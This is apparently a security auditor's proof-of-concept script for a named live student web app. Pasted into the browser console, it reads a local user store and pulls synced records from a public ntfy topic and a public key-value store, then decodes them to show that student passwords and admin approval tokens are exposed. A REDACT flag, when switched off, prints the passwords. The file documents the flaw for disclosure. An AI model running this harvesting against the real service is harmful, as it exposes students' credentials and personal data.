// poc_f01_student_data.js — F-01 / NEW-01 / NEW-16: student record exposure
//                       (DISPLAY-ONLY, read-only, local + public channel read)
//
// Target:  https://trithuc500.vercel.app/
// Findings:
//   F-01    — cloud sync publishes the full user table to a public ntfy topic
//             and a public KV namespace.
//   NEW-01  — the compact wire format carries the password in field `p`.
//   NEW-16  — the V4.4 wire format additionally carries `_adminVipSeal` and
//             `_backendVipToken` (the "teacher approval" artifacts).
// Type:     DISPLAY ONLY. Reads local state and performs READ-ONLY GETs against
//           the public ntfy/KV endpoints. Never POSTs, never writes state.
//
// Usage: paste into DevTools Console on the target page.

(async () => {
    'use strict';

    const CLOUD_SYNC_TOPIC = 'trithuc50_v436_live_sync_hn';
    const CLOUD_SYNC_BACKUP_TOPIC = 'trithuc50_v436_bak_sync_hn';
    const CLOUD_KV_APP_KEY = 'tt50v436hn';
    const KV_GET = 'https://keyvalue.immanuel.co/api/KeyVal/GetValue/' + CLOUD_KV_APP_KEY + '/';

    const REDACT = true;   // set false to reveal password values (owner-approved only)

    function fromBase64UrlSafe(s) {
        try { return Buffer.from(String(s), 'base64url').toString('utf8'); }
        catch (e) { return null; }
    }

    // Base64URL decoder that works in the browser without Buffer.
    function b64urlDecode(str) {
        try {
            let s = String(str).replace(/-/g, '+').replace(/_/g, '/');
            while (s.length % 4) s += '=';
            const bin = atob(s);
            const bytes = new Uint8Array(bin.length);
            for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
            return new TextDecoder('utf-8').decode(bytes);
        } catch (e) { return null; }
    }

    console.log('=== F-01 / NEW-01 / NEW-16 student data exposure (READ-ONLY) ===');

    // ---- 1. Local user store ---------------------------------------------
    const raw = localStorage.getItem('TRITHUC50_USERS_V436_CLEAN');
    let localUsers = [];
    try { localUsers = JSON.parse(raw || '[]'); } catch (e) { localUsers = []; }
    if (!Array.isArray(localUsers)) localUsers = [];

    console.log(`\n[local] TRITHUC50_USERS_V436_CLEAN: ${localUsers.length} record(s)`);

    const localRows = localUsers.map(u => ({
        username: u.username || '',
        name: u.name || '',
        class: u.class || '',
        gmail: u.gmail || '',
        status: u.status || '',
        isVip: u.isVip === true,
        vipPlan: u.vipPlan || 'none',
        maxDevices: u.maxDevices || 2,
        passwordField: Object.prototype.hasOwnProperty.call(u, 'password'),
        sealPresent: !!u._adminVipSeal,
        bktPresent: !!u._backendVipToken
    }));
    if (localRows.length) console.table(localRows);

    // ---- 2. Public ntfy topic (GET only) ---------------------------------
    const topics = [CLOUD_SYNC_TOPIC, CLOUD_SYNC_BACKUP_TOPIC];
    const decodedPackets = [];

    for (const topic of topics) {
        try {
            const resp = await fetch(`https://ntfy.sh/${topic}/json?poll=1&since=24h`);
            const text = await resp.text();
            const lines = text.split('\n').filter(Boolean);
            let decoded = 0;
            for (const line of lines) {
                let msg = line;
                try { msg = JSON.parse(line).message; } catch (e) { /* plain */ }
                if (!msg || !String(msg).startsWith('TT50V4')) continue;
                const body = String(msg).slice(String(msg).indexOf(':') + 1);
                const json = b64urlDecode(body);
                if (!json) continue;
                try {
                    const pkt = JSON.parse(json);
                    decoded++;
                    decodedPackets.push({ topic, pkt });
                } catch (e) { /* ignore */ }
            }
            console.log(`[ntfy] ${topic}: HTTP ${resp.status}, lines=${lines.length}, decoded=${decoded}`);
        } catch (e) {
            console.log(`[ntfy] ${topic}: read failed (${e.message}) — CORS or network`);
        }
    }

    // ---- 3. Public KV snapshot (GET only) --------------------------------
    let kvSnapshot = null;
    try {
        const metaResp = await fetch(KV_GET + 'meta_cnt');
        const metaRaw = (await metaResp.text()).replace(/^"|"$/g, '').trim();
        const cnt = parseInt(metaRaw.split('_')[0], 10);
        console.log(`[kv] meta_cnt raw=${metaRaw} count=${cnt}`);
        if (cnt > 0 && cnt <= 64) {
            const parts = [];
            let missing = 0;
            for (let i = 0; i < cnt; i++) {
                const r = await fetch(KV_GET + `s_${i}`);
                if (!r.ok) { missing++; parts.push(''); continue; }
                const v = (await r.text()).replace(/^"|"$/g, '').trim();
                if (!v) { missing++; parts.push(''); continue; }
                parts.push(v);
            }
            if (missing === 0) {
                const full = b64urlDecode(parts.join(''));
                if (full) { kvSnapshot = JSON.parse(full); decodedPackets.push({ topic: 'KV', pkt: kvSnapshot }); }
            } else {
                console.log(`[kv] ${missing}/${cnt} chunk(s) empty — snapshot not reconstructable`);
            }
        }
    } catch (e) {
        console.log(`[kv] read failed (${e.message}) — CORS or network`);
    }

    // ---- 4. Report on the wire format ------------------------------------
    const allUsers = [];
    decodedPackets.forEach(({ topic, pkt }) => {
        const list = Array.isArray(pkt.users) ? pkt.users : (pkt.user ? [pkt.user] : []);
        list.forEach(u => allUsers.push({ topic, u }));
    });

    console.log(`\n[cloud] packets decoded: ${decodedPackets.length}`);
    console.log(`[cloud] user records in cloud: ${allUsers.length}`);

    if (allUsers.length) {
        const withPassword = allUsers.filter(x => x.u && Object.prototype.hasOwnProperty.call(x.u, 'p'));
        const withSeal = allUsers.filter(x => x.u && x.u.seal);
        const withBkt = allUsers.filter(x => x.u && x.u.bkt);
        console.log(`[cloud] records carrying password field 'p': ${withPassword.length}`);
        console.log(`[cloud] records carrying _adminVipSeal: ${withSeal.length}`);
        console.log(`[cloud] records carrying _backendVipToken: ${withBkt.length}`);

        const rows = allUsers.map(({ topic, u }) => ({
            topic: topic.slice(0, 14),
            user: u.u || '',
            status: u.st || '',
            vp: Array.isArray(u.vp) ? u.vp.join('') : '',
            plan: u.pl || '',
            passwordField: Object.prototype.hasOwnProperty.call(u, 'p'),
            seal: !!u.seal,
            bkt: !!u.bkt
        }));
        console.table(rows);

        if (withPassword.length) {
            console.warn('[NEW-01] CONFIRMED: password field `p` present in cloud user records.');
            if (!REDACT) {
                console.log('password values (UNREDACTED, owner-approved):',
                    withPassword.map(x => ({ user: x.u.u, password: x.u.p })));
            } else {
                console.log('(password values redacted; set REDACT=false to print)');
            }
        }
        if (withSeal.length) {
            console.warn('[NEW-16] CONFIRMED: approval seal published to the public channel.');
        }
    } else {
        console.log('[cloud] no user records observed in the public channels right now.');
    }

    return {
        localUsers: localUsers.length,
        cloudPackets: decodedPackets.length,
        cloudUserRecords: allUsers.length,
        verdicts: {
            'F-01 (cloud publishes user table)': decodedPackets.length > 0 ? 'CONFIRMED' : 'no data observed now',
            'NEW-01 (password in wire format)': allUsers.some(x => Object.prototype.hasOwnProperty.call(x.u, 'p')) ? 'CONFIRMED' : 'not observed now',
            'NEW-16 (seal/bkt in wire format)': allUsers.some(x => x.u.seal) ? 'CONFIRMED' : 'not observed now'
        }
    };
})();
